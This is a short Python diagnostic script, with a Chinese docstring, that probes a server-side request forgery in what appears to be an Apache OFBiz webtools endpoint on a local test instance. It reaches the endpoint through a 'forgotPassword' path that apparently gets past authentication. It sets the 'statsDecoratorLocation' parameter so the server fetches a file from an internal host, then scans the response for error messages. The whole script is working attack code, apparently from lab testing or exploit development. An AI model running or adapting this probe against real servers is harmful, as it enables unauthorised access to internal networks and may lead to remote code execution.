# -*- coding: utf-8 -*-
"""临时诊断：查看 SSRF 探测响应体与跳转行为。"""
import re
import sys

sys.path.insert(0, "..")
from common import session  # noqa: E402

s = session()
r = s.post(
    "https://127.0.0.1:18081/webtools/control/forgotPassword/StatsSinceStart",
    data={"statsDecoratorLocation": "http://infra:8000/hello.txt"},
    headers={"User-Agent": "Mozilla/5.0"}, timeout=30, allow_redirects=False)
t = r.text
print("status", r.status_code, "len", len(t), "location", r.headers.get("Location"))
for kw in ("exception", "error", "Unauthorized", "decorator", "Invalid", "not found"):
    for m in re.finditer(kw, t, re.I):
        seg = t[max(0, m.start() - 80):m.start() + 160].replace("\n", " ")
        print("HIT[%s]: %s" % (kw, seg[:240]))
        break
print("---tail 600---")
print(t[-600:])
